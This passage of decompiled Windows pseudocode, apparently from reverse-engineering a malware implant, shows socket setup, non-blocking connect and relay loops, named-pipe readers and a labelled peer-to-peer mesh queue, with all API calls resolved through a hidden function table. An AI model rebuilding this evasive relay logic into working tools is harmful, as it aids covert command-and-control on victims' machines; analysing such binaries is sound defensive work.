/* FUN_35d451428 @ 35d451428 */

/* WARNING: Type propagation algorithm not settling */

void FUN_35d451428(longlong *param_1,undefined4 param_2,undefined4 param_3,undefined8 param_4,
                  ushort param_5,int *param_6)

{
  bool bVar1;
  int iVar2;
  uint uVar3;
  undefined8 in_stack_fffffffffffffbc0;
  undefined4 uVar4;
  undefined4 local_400 [2];
  longlong lStack_3f8;
  undefined4 local_1f8;
  int local_1f4 [5];
  undefined1 local_1e0 [8];
  undefined8 local_1d8;
  undefined1 local_1d0 [416];
  undefined4 local_30;
  int local_2c;
  int local_28;
  int local_24;
  longlong local_20;
  longlong local_18;
  
  uVar4 = (undefined4)((ulonglong)in_stack_fffffffffffffbc0 >> 0x20);
  iVar2 = (**(code **)(g_win32_api_table + 0x268))(0x202,local_1d0);
  if (iVar2 != 0) {
    (**(code **)(g_win32_api_table + 0x270))();
    return;
  }
  local_18 = (**(code **)(g_win32_api_table + 0x278))(2,1,0);
  if ((local_18 != -1) && (local_20 = (**(code **)(g_win32_api_table + 0x280))(param_4), local_20 != 0))
  {
    local_1e0 = (undefined1  [8])0x0;
    local_1d8 = 0;
    memcpy_wrapper((undefined8 *)(local_1e0 + 4),(undefined8 *)**(undefined8 **)(local_20 + 0x18),
                  (longlong)*(short *)(local_20 + 0x12));
    local_1e0._0_2_ = 2;
    uVar3 = FUN_35d453d81(param_5);
    local_1e0._2_2_ = (short)uVar3;
    local_1f4[4] = 100;
    (**(code **)(g_win32_api_table + 0x298))(local_18,0xffff,0x1006,local_1f4 + 4,CONCAT44(uVar4,4));
    (**(code **)(g_win32_api_table + 0x298))(local_18,0xffff,0x1005,local_1f4 + 4,4);
    local_1f4[3] = 1;
    (**(code **)(g_win32_api_table + 0x288))(local_18,0x8004667e,local_1f4 + 3);
    local_24 = (**(code **)(g_win32_api_table + 0x290))(local_18,local_1e0,0x10);
    if (local_24 == 0) {
      FUN_35d4511c8(param_1,param_2,param_3,local_18,30000,0,0,0,2);
      (**(code **)(g_win32_api_table + 0x270))();
      return;
    }
    local_28 = (**(code **)(g_win32_api_table + 0x2a8))();
    if (local_28 != 0x2733) {
      (**(code **)(g_win32_api_table + 0x2b0))(local_18);
      (**(code **)(g_win32_api_table + 0x270))();
      FUN_35d4510ee(param_6,param_2,0x3e,param_3,local_28);
      return;
    }
    lStack_3f8 = local_18;
    local_400[0] = 1;
    local_1f4[1] = 0;
    local_1f4[2] = 100000;
    local_2c = (**(code **)(g_win32_api_table + 0x2b8))(0,0,local_400,0,local_1f4 + 1);
    if ((local_2c < 1) ||
       (iVar2 = (**(code **)(g_win32_api_table + 0x2c0))(local_18,local_400), iVar2 == 0)) {
      bVar1 = false;
    }
    else {
      bVar1 = true;
    }
    if (bVar1) {
      local_1f4[0] = 0;
      local_1f8 = 4;
      (**(code **)(g_win32_api_table + 0x2a0))(local_18,0xffff,0x1007,local_1f4,&local_1f8);
      if (local_1f4[0] == 0) {
        FUN_35d4511c8(param_1,param_2,param_3,local_18,30000,0,0,0,2);
        return;
      }
      (**(code **)(g_win32_api_table + 0x2b0))(local_18);
      FUN_35d4510ee(param_6,param_2,0x3e,param_3,local_1f4[0]);
    }
    else {
      (**(code **)(g_win32_api_table + 0x2b0))(local_18);
      FUN_35d4510ee(param_6,param_2,0x3e,param_3,0x274c);
    }
  }
  local_30 = (**(code **)(g_win32_api_table + 0x2a8))();
  (**(code **)(g_win32_api_table + 0x2b0))(local_18);
  FUN_35d4510ee(param_6,param_2,0x3e,param_3,local_30);
  return;
}



/* FUN_35d4519aa @ 35d4519aa */

void FUN_35d4519aa(longlong *param_1,undefined4 param_2,undefined8 param_3,undefined2 param_4,
                  int *param_5)

{
  int iVar1;
  undefined4 local_1e4;
  undefined8 local_1e0;
  undefined8 local_1d8;
  undefined4 local_1c4;
  undefined1 local_1c0 [412];
  undefined4 local_24;
  longlong local_20;
  longlong local_18;
  
  iVar1 = (**(code **)(g_win32_api_table + 0x268))(0x202,local_1c0);
  if (iVar1 == 0) {
    local_18 = (**(code **)(g_win32_api_table + 0x278))(2,2,0);
    if ((local_18 != -1) &&
       (local_20 = (**(code **)(g_win32_api_table + 0x280))(param_3), local_20 != 0)) {
      local_1c4 = 0;
      memcpy_wrapper((undefined8 *)&local_1c4,(undefined8 *)**(undefined8 **)(local_20 + 0x18),4);
      local_1d8 = 0;
      local_1e0 = 2;
      iVar1 = (**(code **)(g_win32_api_table + 0x300))(local_18,&local_1e0,0x10);
      if (iVar1 == 0) {
        local_1e4 = 1;
        iVar1 = (**(code **)(g_win32_api_table + 0x288))(local_18,0x8004667e,&local_1e4);
        if (iVar1 != -1) {
          FUN_35d4511c8(param_1,param_2,2,local_18,30000,1,local_1c4,param_4,2);
          return;
        }
      }
    }
    local_24 = (**(code **)(g_win32_api_table + 0x2a8))();
    (**(code **)(g_win32_api_table + 0x2b0))(local_18);
    FUN_35d4510ee(param_5,param_2,0x3e,2,local_24);
  }
  else {
    (**(code **)(g_win32_api_table + 0x270))();
  }
  return;
}



/* FUN_35d451bdc @ 35d451bdc */

void FUN_35d451bdc(longlong *param_1,int param_2,undefined8 *param_3,uint param_4,int *param_5)

{
  int iVar1;
  int *piVar2;
  longlong lVar3;
  undefined8 uVar4;
  ulonglong uVar5;
  uint uVar6;
  int local_20;
  int local_1c;
  
  if ((param_3 != (undefined8 *)0x0) && (param_4 != 0)) {
    for (local_1c = 0; uVar5 = FUN_35d456cd0((longlong)param_1),
        (ulonglong)(longlong)local_1c < uVar5; local_1c = local_1c + 1) {
      piVar2 = (int *)FUN_35d455cf0(param_1,(longlong)local_1c);
      if ((param_2 == *piVar2) && ((char)piVar2[4] == '\x01')) {
        if ((*(longlong *)(piVar2 + 10) != 0) && (piVar2[0xc] != 0)) {
          if (0x1000000 < param_4 + piVar2[0xc]) {
            (**(code **)(g_win32_api_table + 0x2b0))(*(undefined8 *)(piVar2 + 2));
            *(undefined1 *)(piVar2 + 4) = 0;
            heap_realloc((longlong *)(piVar2 + 10),piVar2[0xc]);
            piVar2[10] = 0;
            piVar2[0xb] = 0;
            piVar2[0xc] = 0;
            if (param_5 == (int *)0x0) {
              return;
            }
            FUN_35d4510ee(param_5,param_2,0x42,0,0x2747);
            return;
          }
          lVar3 = heap_alloc_zeroed(*(undefined8 *)(piVar2 + 10),piVar2[0xc] + param_4);
          if (lVar3 == 0) {
            (**(code **)(g_win32_api_table + 0x2b0))(*(undefined8 *)(piVar2 + 2));
            *(undefined1 *)(piVar2 + 4) = 0;
            heap_realloc((longlong *)(piVar2 + 10),piVar2[0xc]);
            piVar2[10] = 0;
            piVar2[0xb] = 0;
            piVar2[0xc] = 0;
            if (param_5 == (int *)0x0) {
              return;
            }
            FUN_35d4510ee(param_5,param_2,0x42,0,0x2747);
            return;
          }
          *(longlong *)(piVar2 + 10) = lVar3;
          memcpy_wrapper((undefined8 *)(*(longlong *)(piVar2 + 10) + (ulonglong)(uint)piVar2[0xc]),
                        param_3,(ulonglong)param_4);
          piVar2[0xc] = piVar2[0xc] + param_4;
          if (param_5 == (int *)0x0) {
            return;
          }
          if ((uint)piVar2[0xc] < 0x400001) {
            return;
          }
          if (piVar2[0xd] != 0) {
            return;
          }
          piVar2[0xd] = 1;
          FUN_35d451144(param_5,param_2,0x45);
          return;
        }
        local_20 = (**(code **)(g_win32_api_table + 0x2e0))
                             (*(undefined8 *)(piVar2 + 2),param_3,param_4,0);
        if (local_20 == -1) {
          iVar1 = (**(code **)(g_win32_api_table + 0x2a8))();
          if (iVar1 != 0x2733) {
            (**(code **)(g_win32_api_table + 0x2b0))(*(undefined8 *)(piVar2 + 2));
            *(undefined1 *)(piVar2 + 4) = 0;
            if (param_5 == (int *)0x0) {
              return;
            }
            FUN_35d4510ee(param_5,param_2,0x42,0,iVar1);
            return;
          }
          local_20 = 0;
        }
        if ((int)param_4 <= local_20) {
          return;
        }
        uVar6 = param_4 - local_20;
        if (0x1000000 < uVar6) {
          (**(code **)(g_win32_api_table + 0x2b0))(*(undefined8 *)(piVar2 + 2));
          *(undefined1 *)(piVar2 + 4) = 0;
          if (param_5 == (int *)0x0) {
            return;
          }
          FUN_35d4510ee(param_5,param_2,0x42,0,0x2747);
          return;
        }
        uVar4 = heap_alloc(uVar6);
        *(undefined8 *)(piVar2 + 10) = uVar4;
        if (*(longlong *)(piVar2 + 10) == 0) {
          (**(code **)(g_win32_api_table + 0x2b0))(*(undefined8 *)(piVar2 + 2));
          *(undefined1 *)(piVar2 + 4) = 0;
          if (param_5 == (int *)0x0) {
            return;
          }
          FUN_35d4510ee(param_5,param_2,0x42,0,0x2747);
          return;
        }
        memcpy_wrapper(*(undefined8 **)(piVar2 + 10),
                      (undefined8 *)((longlong)local_20 + (longlong)param_3),(ulonglong)uVar6);
        piVar2[0xc] = uVar6;
        if (param_5 == (int *)0x0) {
          return;
        }
        if ((uint)piVar2[0xc] < 0x400001) {
          return;
        }
        if (piVar2[0xd] != 0) {
          return;
        }
        piVar2[0xd] = 1;
        FUN_35d451144(param_5,param_2,0x45);
        return;
      }
    }
  }
  return;
}



/* FUN_35d4520b4 @ 35d4520b4 */

void FUN_35d4520b4(longlong *param_1,int param_2,undefined8 param_3,undefined4 param_4)

{
  int iVar1;
  uint uVar2;
  ulonglong uVar3;
  ulonglong uVar4;
  undefined4 local_460 [2];
  undefined8 local_458;
  undefined4 local_250 [2];
  undefined8 local_248;
  undefined2 local_40;
  undefined2 local_3e;
  int local_3c;
  undefined4 local_2c;
  undefined4 local_28;
  uint local_24;
  int *local_20;
  int local_14;
  
  local_14 = 0;
  while( true ) {
    uVar4 = (ulonglong)local_14;
    uVar3 = FUN_35d456cd0((longlong)param_1);
    if (uVar3 <= uVar4) {
      return;
    }
    local_20 = (int *)FUN_35d455cf0(param_1,(longlong)local_14);
    if ((param_2 == *local_20) && ((char)local_20[4] == '\x01')) break;
    local_14 = local_14 + 1;
  }
  iVar1 = (**(code **)(g_win32_api_table + 0x110))();
  local_24 = iVar1 + 30000;
  local_2c = 0;
  local_28 = 100;
  while( true ) {
    uVar2 = (**(code **)(g_win32_api_table + 0x110))();
    if (local_24 <= uVar2) {
      return;
    }
    local_458 = *(undefined8 *)(local_20 + 2);
    local_250[0] = 1;
    local_460[0] = 1;
    local_248 = local_458;
    (**(code **)(g_win32_api_table + 0x2b8))(0,0,local_250,local_460,&local_2c);
    iVar1 = (**(code **)(g_win32_api_table + 0x2c0))(*(undefined8 *)(local_20 + 2),local_460);
    if (iVar1 != 0) break;
    iVar1 = (**(code **)(g_win32_api_table + 0x2c0))(*(undefined8 *)(local_20 + 2),local_250);
    if (iVar1 != 0) {
      local_40 = 2;
      uVar2 = FUN_35d453d81(*(ushort *)(local_20 + 6));
      local_3e = (undefined2)uVar2;
      local_3c = local_20[5];
      (**(code **)(g_win32_api_table + 0x2e8))
                (*(undefined8 *)(local_20 + 2),param_3,param_4,0,&local_40,0x10);
    }
  }
  return;
}



/* FUN_35d45232a @ 35d45232a */

void FUN_35d45232a(longlong *param_1,int param_2)

{
  int *piVar1;
  ulonglong uVar2;
  int local_1c;
  
  local_1c = 0;
  while( true ) {
    uVar2 = FUN_35d456cd0((longlong)param_1);
    if (uVar2 <= (ulonglong)(longlong)local_1c) {
      return;
    }
    piVar1 = (int *)FUN_35d455cf0(param_1,(longlong)local_1c);
    if (param_2 == *piVar1) break;
    local_1c = local_1c + 1;
  }
  piVar1[0xe] = 1;
  return;
}



/* FUN_35d452398 @ 35d452398 */

void FUN_35d452398(longlong *param_1,int param_2)

{
  int *piVar1;
  ulonglong uVar2;
  int local_1c;
  
  local_1c = 0;
  while( true ) {
    uVar2 = FUN_35d456cd0((longlong)param_1);
    if (uVar2 <= (ulonglong)(longlong)local_1c) {
      return;
    }
    piVar1 = (int *)FUN_35d455cf0(param_1,(longlong)local_1c);
    if (param_2 == *piVar1) break;
    local_1c = local_1c + 1;
  }
  piVar1[0xe] = 0;
  return;
}



/* FUN_35d452406 @ 35d452406 */

void FUN_35d452406(longlong *param_1,int param_2)

{
  int *piVar1;
  ulonglong uVar2;
  int local_1c;
  
  local_1c = 0;
  while( true ) {
    uVar2 = FUN_35d456cd0((longlong)param_1);
    if (uVar2 <= (ulonglong)(longlong)local_1c) {
      return;
    }
    piVar1 = (int *)FUN_35d455cf0(param_1,(longlong)local_1c);
    if ((param_2 == *piVar1) && ((char)piVar1[4] != '\0')) break;
    local_1c = local_1c + 1;
  }
  *(undefined1 *)(piVar1 + 4) = 0;
  return;
}



/* FUN_35d452486 @ 35d452486 */

void FUN_35d452486(longlong *param_1,undefined4 param_2,ushort param_3,int *param_4)

{
  undefined8 *puVar1;
  ulonglong uVar2;
  longlong lVar3;
  undefined4 uStack_5c;
  char local_50;
  char cStack_4f;
  ushort local_48;
  int local_14;
  
  local_14 = 0;
  while( true ) {
    uVar2 = FUN_35d456cd0((longlong)param_1);
    if (uVar2 <= (ulonglong)(longlong)local_14) {
      lVar3 = FUN_35d45128c(param_3,10);
      if (lVar3 == -1) {
        FUN_35d4510ee(param_4,param_2,0x43,5,1);
      }
      else {
        FUN_35d4511c8(param_1,param_2,5,lVar3,0,2,0,param_3,2);
        FUN_35d4510ee(param_4,param_2,0x43,5,2);
      }
      return;
    }
    puVar1 = (undefined8 *)FUN_35d455cf0(param_1,(longlong)local_14);
    cStack_4f = (char)((ulonglong)puVar1[2] >> 8);
    if (((cStack_4f == '\x02') && (local_48 = (ushort)puVar1[3], param_3 == local_48)) &&
       (local_50 = (char)puVar1[2], local_50 != '\0')) break;
    local_14 = local_14 + 1;
  }
  uStack_5c = (undefined4)((ulonglong)*puVar1 >> 0x20);
  FUN_35d4510ee(param_4,param_2,0x43,uStack_5c,1);
  return;
}



/* FUN_35d452646 @ 35d452646 */

void FUN_35d452646(longlong *param_1,int *param_2)

{
  int iVar1;
  ulonglong uVar2;
  ulonglong uVar3;
  undefined4 local_680 [2];
  undefined8 local_678;
  undefined4 local_470 [2];
  undefined8 local_468;
  undefined4 local_260 [2];
  undefined8 local_258;
  undefined4 local_50;
  undefined4 local_4c;
  undefined4 local_48;
  undefined4 local_44;
  undefined8 local_40;
  longlong local_38;
  undefined8 local_30;
  undefined4 local_24;
  undefined4 *local_20;
  int local_14;
  
  local_4c = 0;
  local_48 = 100;
  local_14 = 0;
  do {
    uVar3 = (ulonglong)local_14;
    uVar2 = FUN_35d456cd0((longlong)param_1);
    if (uVar2 <= uVar3) {
      return;
    }
    local_20 = (undefined4 *)FUN_35d455cf0(param_1,(longlong)local_14);
    if (*(char *)(local_20 + 4) == '\x02') {
      local_24 = *local_20;
      local_680[0] = 1;
      local_678 = *(undefined8 *)(local_20 + 2);
      local_470[0] = 1;
      local_468 = *(undefined8 *)(local_20 + 2);
      local_260[0] = 1;
      local_258 = *(undefined8 *)(local_20 + 2);
      (**(code **)(g_win32_api_table + 0x2b8))(0,local_680,local_260,local_470,&local_4c);
      if (*(char *)((longlong)local_20 + 0x11) == '\x02') {
        iVar1 = (**(code **)(g_win32_api_table + 0x2c0))(*(undefined8 *)(local_20 + 2),local_680);
        if (iVar1 != 0) {
          local_40 = (**(code **)(g_win32_api_table + 0x2f0))(*(undefined8 *)(local_20 + 2),0,0);
          local_50 = 1;
          iVar1 = (**(code **)(g_win32_api_table + 0x288))(local_40,0x8004667e,&local_50);
          if (iVar1 == -1) {
            (**(code **)(g_win32_api_table + 0x2b0))(local_40);
          }
          else {
            local_44 = prng_next();
            binary_buffer_write_uint32(param_2,*local_20);
            binary_buffer_write_uint32(param_2,0x44);
            binary_buffer_write_uint32(param_2,local_44);
            FUN_35d4511c8(param_1,local_44,5,local_40,180000,0,0,0,1);
          }
        }
      }
      else if (*(char *)((longlong)local_20 + 0x11) == '\x01') {
        iVar1 = (**(code **)(g_win32_api_table + 0x2c0))(*(undefined8 *)(local_20 + 2),local_470);
        if (iVar1 == 0) {
          iVar1 = (**(code **)(g_win32_api_table + 0x2c0))(*(undefined8 *)(local_20 + 2),local_260);
          if (iVar1 == 0) goto LAB_35d452c1f;
          *(undefined1 *)(local_20 + 4) = 1;
          FUN_35d4510ee(param_2,*local_20,0x3e,local_20[1],0);
        }
        else {
          *(undefined1 *)(local_20 + 4) = 0;
          FUN_35d4510ee(param_2,*local_20,0x3e,local_20[1],1);
        }
      }
      else if (*(char *)((longlong)local_20 + 0x11) == '\0') {
        iVar1 = (**(code **)(g_win32_api_table + 0x2c0))(*(undefined8 *)(local_20 + 2),local_470);
        if (iVar1 == 0) {
          iVar1 = (**(code **)(g_win32_api_table + 0x2c0))(*(undefined8 *)(local_20 + 2),local_260);
          if (iVar1 == 0) {
            iVar1 = (**(code **)(g_win32_api_table + 0x2c0))(*(undefined8 *)(local_20 + 2),local_680);
            if (iVar1 == 0) goto LAB_35d452c1f;
            local_30 = *(undefined8 *)(local_20 + 2);
            local_38 = (**(code **)(g_win32_api_table + 0x2f0))(local_30,0,0);
            if (local_38 == -1) {
              *(undefined1 *)(local_20 + 4) = 0;
              FUN_35d4510ee(param_2,*local_20,0x3e,local_20[1],1);
            }
            else {
              *(longlong *)(local_20 + 2) = local_38;
              *(undefined1 *)(local_20 + 4) = 1;
              FUN_35d4510ee(param_2,*local_20,0x3e,local_20[1],0);
            }
            (**(code **)(g_win32_api_table + 0x2b0))(local_30);
          }
          else {
            *(undefined1 *)(local_20 + 4) = 1;
            FUN_35d4510ee(param_2,*local_20,0x3e,local_20[1],0);
          }
        }
        else {
          *(undefined1 *)(local_20 + 4) = 0;
          FUN_35d4510ee(param_2,*local_20,0x3e,local_20[1],1);
        }
      }
      else {
LAB_35d452c1f:
        iVar1 = (**(code **)(g_win32_api_table + 0x110))();
        if ((uint)local_20[7] < (uint)(iVar1 - local_20[8])) {
          *(undefined1 *)(local_20 + 4) = 0;
          FUN_35d4510ee(param_2,*local_20,0x3e,local_20[1],1);
        }
      }
    }
    local_14 = local_14 + 1;
  } while( true );
}



/* FUN_35d452cd2 @ 35d452cd2 */

int FUN_35d452cd2(longlong *param_1,int *param_2)

{
  bool bVar1;
  uint uVar2;
  int iVar3;
  ulonglong uVar4;
  ulonglong uVar5;
  undefined1 local_65;
  undefined4 local_64;
  undefined8 local_60;
  undefined8 local_58;
  undefined8 *local_48;
  undefined8 *local_40;
  uint local_38;
  int local_34;
  int local_30;
  uint local_2c;
  undefined4 *local_28;
  int local_1c;
  int local_18;
  int local_14;
  
  local_14 = 0;
  local_40 = (undefined8 *)heap_alloc(0x10000);
  local_18 = 0;
  do {
    uVar5 = (ulonglong)local_18;
    uVar4 = FUN_35d456cd0((longlong)param_1);
    if ((uVar4 <= uVar5) || (uVar2 = binary_buffer_get_size((longlong)param_2), 0x400000 < uVar2)) {
      heap_realloc((longlong *)&local_40,0x10000);
      return local_14;
    }
    local_28 = (undefined4 *)FUN_35d455cf0(param_1,(longlong)local_18);
    if (((*(char *)(local_28 + 4) == '\x01') && (local_28[0xe] == 0)) &&
       ((uint)local_28[0xc] < 0x400001)) {
      if (*(char *)((longlong)local_28 + 0x11) == '\x01') {
        local_48 = (undefined8 *)heap_alloc(0xffffc);
        local_60 = 0;
        local_58 = 0;
        local_64 = 0x10;
        local_38 = (**(code **)(g_win32_api_table + 0x2d8))
                             (*(undefined8 *)(local_28 + 2),local_48,0xffffc,0,&local_60,&local_64);
        if (local_38 == 0xffffffff) {
          iVar3 = (**(code **)(g_win32_api_table + 0x2a8))();
          if (iVar3 != 0x2733) {
            *(undefined1 *)(local_28 + 4) = 0;
            FUN_35d4510ee(param_2,*local_28,0x3e,local_28[1],1);
          }
        }
        else if (local_38 != 0) {
          FUN_35d451178(param_2,*local_28,local_48,local_38);
          local_14 = local_14 + 1;
        }
        heap_realloc((longlong *)&local_48,0xffffc);
      }
      else {
        local_1c = 0x10;
        while (iVar3 = local_1c + -1, bVar1 = 0 < local_1c, local_1c = iVar3, bVar1) {
          local_2c = (**(code **)(g_win32_api_table + 0x2d0))
                               (*(undefined8 *)(local_28 + 2),local_40,0x10000,0);
          if ((int)local_2c < 1) {
            if (local_2c == 0) {
              *(undefined1 *)(local_28 + 4) = 0;
              FUN_35d4510ee(param_2,*local_28,0x3e,local_28[1],1);
              break;
            }
            if (local_2c == 0xffffffff) {
              local_34 = (**(code **)(g_win32_api_table + 0x2a8))();
              if (local_34 != 0x2733) {
                *(undefined1 *)(local_28 + 4) = 0;
                FUN_35d4510ee(param_2,*local_28,0x3e,local_28[1],1);
              }
              break;
            }
            local_30 = (**(code **)(g_win32_api_table + 0x2d0))
                                 (*(undefined8 *)(local_28 + 2),&local_65,1,2);
            if (local_30 == 0) {
              *(undefined1 *)(local_28 + 4) = 0;
              FUN_35d4510ee(param_2,*local_28,0x3e,local_28[1],1);
            }
          }
          else {
            FUN_35d451178(param_2,*local_28,local_40,local_2c);
            local_14 = local_14 + 1;
          }
        }
      }
    }
    local_18 = local_18 + 1;
  } while( true );
}



/* FUN_35d4530ba @ 35d4530ba */

void FUN_35d4530ba(longlong *param_1,int *param_2)

{
  bool bVar1;
  int iVar2;
  ulonglong uVar3;
  ulonglong uVar4;
  undefined4 local_250 [2];
  undefined8 uStack_248;
  undefined4 local_40;
  undefined4 local_3c;
  undefined8 *local_38;
  uint local_30;
  int local_2c;
  uint local_28;
  int local_24;
  undefined4 *local_20;
  int local_14;
  
  local_40 = 0;
  local_3c = 0;
  for (local_14 = 0; uVar4 = (ulonglong)local_14, uVar3 = FUN_35d456cd0((longlong)param_1),
      uVar4 < uVar3; local_14 = local_14 + 1) {
    local_20 = (undefined4 *)FUN_35d455cf0(param_1,(longlong)local_14);
    if (((*(char *)(local_20 + 4) == '\x01') && (*(longlong *)(local_20 + 10) != 0)) &&
       (local_20[0xc] != 0)) {
      uStack_248 = *(undefined8 *)(local_20 + 2);
      local_250[0] = 1;
      local_24 = (**(code **)(g_win32_api_table + 0x2b8))(0,0,local_250,0,&local_40);
      if ((local_24 < 1) ||
         (iVar2 = (**(code **)(g_win32_api_table + 0x2c0))(*(undefined8 *)(local_20 + 2),local_250),
         iVar2 == 0)) {
        bVar1 = true;
      }
      else {
        bVar1 = false;
      }
      if (!bVar1) {
        local_28 = (**(code **)(g_win32_api_table + 0x2e0))
                             (*(undefined8 *)(local_20 + 2),*(undefined8 *)(local_20 + 10),
                              local_20[0xc],0);
        if ((int)local_28 < 1) {
          if ((local_28 == 0xffffffff) &&
             (local_2c = (**(code **)(g_win32_api_table + 0x2a8))(), local_2c != 0x2733)) {
            if (*(longlong *)(local_20 + 10) != 0) {
              heap_realloc((longlong *)(local_20 + 10),local_20[0xc]);
              *(undefined8 *)(local_20 + 10) = 0;
              local_20[0xc] = 0;
            }
            (**(code **)(g_win32_api_table + 0x2b0))(*(undefined8 *)(local_20 + 2));
            *(undefined1 *)(local_20 + 4) = 0;
            if (param_2 != (int *)0x0) {
              FUN_35d4510ee(param_2,*local_20,0x42,0,local_2c);
            }
          }
        }
        else if (local_28 < (uint)local_20[0xc]) {
          local_30 = local_20[0xc] - local_28;
          local_38 = (undefined8 *)heap_alloc(local_30);
          if (local_38 == (undefined8 *)0x0) {
            heap_realloc((longlong *)(local_20 + 10),local_20[0xc]);
            *(undefined8 *)(local_20 + 10) = 0;
            local_20[0xc] = 0;
            (**(code **)(g_win32_api_table + 0x2b0))(*(undefined8 *)(local_20 + 2));
            *(undefined1 *)(local_20 + 4) = 0;
            if (param_2 != (int *)0x0) {
              FUN_35d4510ee(param_2,*local_20,0x42,0,0x2747);
            }
          }
          else {
            memcpy_wrapper(local_38,(undefined8 *)
                                   (*(longlong *)(local_20 + 10) + (longlong)(int)local_28),
                          (ulonglong)local_30);
            heap_realloc((longlong *)(local_20 + 10),local_20[0xc]);
            *(undefined8 **)(local_20 + 10) = local_38;
            local_20[0xc] = local_30;
            if (((param_2 != (int *)0x0) && (local_20[0xd] != 0)) &&
               ((uint)local_20[0xc] < 0x100000)) {
              local_20[0xd] = 0;
              FUN_35d451144(param_2,*local_20,0x46);
            }
          }
        }
        else {
          heap_realloc((longlong *)(local_20 + 10),local_20[0xc]);
          *(undefined8 *)(local_20 + 10) = 0;
          local_20[0xc] = 0;
          if ((param_2 != (int *)0x0) && (local_20[0xd] != 0)) {
            local_20[0xd] = 0;
            FUN_35d451144(param_2,*local_20,0x46);
          }
        }
      }
    }
  }
  return;
}



/* FUN_35d4535fc @ 35d4535fc */

void FUN_35d4535fc(longlong *param_1)

{
  bool bVar1;
  undefined4 uVar2;
  uint uVar3;
  int iVar4;
  longlong lVar5;
  ulonglong uVar6;
  undefined4 local_1c;
  
  local_1c = 0;
  while( true ) {
    uVar6 = FUN_35d456cd0((longlong)param_1);
    if (uVar6 <= (ulonglong)(longlong)local_1c) break;
    lVar5 = FUN_35d455cf0(param_1,(longlong)local_1c);
    if (*(char *)(lVar5 + 0x10) == '\0') {
      if (*(int *)(lVar5 + 0x24) == 0) {
        uVar2 = (**(code **)(g_win32_api_table + 0x110))();
        *(undefined4 *)(lVar5 + 0x24) = uVar2;
      }
      else {
        iVar4 = *(int *)(lVar5 + 0x24);
        uVar3 = (**(code **)(g_win32_api_table + 0x110))();
        if (iVar4 + 1000U < uVar3) {
          if ((*(char *)(lVar5 + 0x11) == '\0') || (*(char *)(lVar5 + 0x11) == '\x01')) {
            (**(code **)(g_win32_api_table + 0x2c8))(*(undefined8 *)(lVar5 + 8),2);
          }
          iVar4 = (**(code **)(g_win32_api_table + 0x2b0))(*(undefined8 *)(lVar5 + 8));
          if ((iVar4 == 0) || (*(char *)(lVar5 + 0x11) != '\x02')) {
            bVar1 = false;
          }
          else {
            bVar1 = true;
          }
          if (!bVar1) {
            if (*(longlong *)(lVar5 + 0x28) != 0) {
              heap_realloc((longlong *)(lVar5 + 0x28),*(uint *)(lVar5 + 0x30));
              *(undefined8 *)(lVar5 + 0x28) = 0;
              *(undefined4 *)(lVar5 + 0x30) = 0;
            }
            FUN_35d455980(param_1,(longlong)local_1c);
            local_1c = local_1c + -1;
          }
        }
      }
    }
    local_1c = local_1c + 1;
  }
  return;
}



/* p2p_mesh_process_queue @ 35d453792 */

void p2p_mesh_process_queue(longlong *param_1,int *param_2)

{
  bool bVar1;
  int iVar2;
  int iVar3;
  uint uVar4;
  longlong lVar5;
  
  lVar5 = FUN_35d456cd0((longlong)param_1);
  if (lVar5 != 0) {
    FUN_35d452646(param_1,param_2);
    FUN_35d4530ba(param_1,param_2);
    iVar2 = (**(code **)(g_win32_api_table + 0x110))();
    do {
      iVar3 = FUN_35d452cd2(param_1,param_2);
      if (iVar3 == 0) {
LAB_35d45382b:
        bVar1 = false;
      }
      else {
        uVar4 = (**(code **)(g_win32_api_table + 0x110))();
        if (iVar2 + 0x9c4U <= uVar4) goto LAB_35d45382b;
        bVar1 = true;
      }
    } while (bVar1);
    FUN_35d4535fc(param_1);
  }
  return;
}



/* heap_alloc @ 35d453850 */

void heap_alloc(undefined4 param_1)

{
  (**(code **)(g_win32_api_table + 0x160))(0x40,param_1);
  return;
}



/* heap_alloc_zeroed @ 35d45387c */

undefined8 heap_alloc_zeroed(undefined8 param_1,undefined4 param_2)

{
  undefined8 uVar1;
  
  uVar1 = (**(code **)(g_win32_api_table + 0x170))(param_1,param_2,2);
  return uVar1;
}



/* heap_realloc @ 35d4538b9 */

void heap_realloc(longlong *param_1,uint param_2)

{
  if (*param_1 != 0) {
    memset_wrapper((ulonglong *)*param_1,0,(ulonglong)param_2);
    (**(code **)(g_win32_api_table + 0x168))(*param_1);
    *param_1 = 0;
  }
  return;
}



/* FUN_35d45391b @ 35d45391b */

longlong FUN_35d45391b(undefined8 param_1,uint *param_2)

{
  int local_20;
  uint local_1c;
  longlong local_18;
  int local_c;
  
  local_c = 0;
  local_1c = 0;
  local_18 = heap_alloc(0);
  while( true ) {
    local_20 = 0;
    (**(code **)(g_win32_api_table + 400))(param_1,0,0x1000,0,&local_20,0);
    if (local_20 == 0) {
      local_c = 0;
    }
    else {
      local_c = (**(code **)(g_win32_api_table + 0x198))(param_1,&DAT_35d4590a0,0x1000,&local_1c,0);
      if (local_1c == 0) {
        return local_18;
      }
      *param_2 = *param_2 + local_1c;
      local_18 = heap_alloc_zeroed(local_18,*param_2);
      memcpy_wrapper((undefined8 *)(local_18 + (ulonglong)(*param_2 - local_1c)),
                    (undefined8 *)&DAT_35d4590a0,(ulonglong)local_1c);
      memset_wrapper((ulonglong *)&DAT_35d4590a0,0,(ulonglong)local_1c);
    }
    if (0x100000 < *param_2) break;
    if (local_c == 0) {
      return local_18;
    }
  }
  return local_18;
}



/* FUN_35d453a77 @ 35d453a77 */

undefined8 FUN_35d453a77(undefined8 param_1,int param_2)

{
  int iVar1;
  uint uVar2;
  int local_10;
  uint local_c;
  
  iVar1 = (**(code **)(g_win32_api_table + 0x110))();
  local_c = iVar1 + param_2;
  local_10 = 0;
  while( true ) {
    iVar1 = (**(code **)(g_win32_api_table + 400))(param_1,0,0,0,&local_10,0);
    if (iVar1 == 0) {
      return 0;
    }
    if (local_10 != 0) break;
    uVar2 = (**(code **)(g_win32_api_table + 0x110))();
    if (local_c <= uVar2) {
      return 0;
    }
    (**(code **)(g_win32_api_table + 0x1d0))(10);
  }
  return 1;
}



/* FUN_35d453b46 @ 35d453b46 */

uint FUN_35d453b46(undefined8 param_1,longlong param_2,uint param_3)

{
  bool bVar1;
  int iVar2;
  int local_10;
  uint local_c;
  
  local_10 = 0;
  local_c = 0;
  do {
    iVar2 = (**(code **)(g_win32_api_table + 0x198))
                      (param_1,(int)local_c + param_2,param_3 - local_c,&local_10,0);
    if ((iVar2 == 0) || (local_10 == 0)) {
      bVar1 = false;
    }
    else {
      bVar1 = true;
    }
    if (!bVar1) {
      return local_c;
    }
    local_c = local_10 + local_c;
    if (param_3 < local_c) {
